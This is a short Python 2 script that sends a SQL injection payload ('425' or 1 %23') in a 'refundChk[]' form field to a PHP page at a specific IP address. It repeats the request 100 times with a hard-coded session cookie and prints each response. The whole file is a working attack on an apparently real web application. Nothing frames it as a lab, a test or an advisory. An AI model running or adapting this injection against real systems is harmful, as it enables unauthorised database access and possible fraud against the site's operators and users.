import urllib2
import urllib
url = "http://112.166.114.151/lang/ko/myage.php"
# 423 323 425
for i in range(100):
    data = {"refundChk[]":"425' or 1 %23"}
    request = urllib2.Request(url, urllib.urlencode(data))
    request.add_header('cookie',"PHPSESSID=fidq0cnspfr0i7pi5i5jvjnbm2")
    response = urllib2.urlopen(request)
    k = response.read()
    print k
    
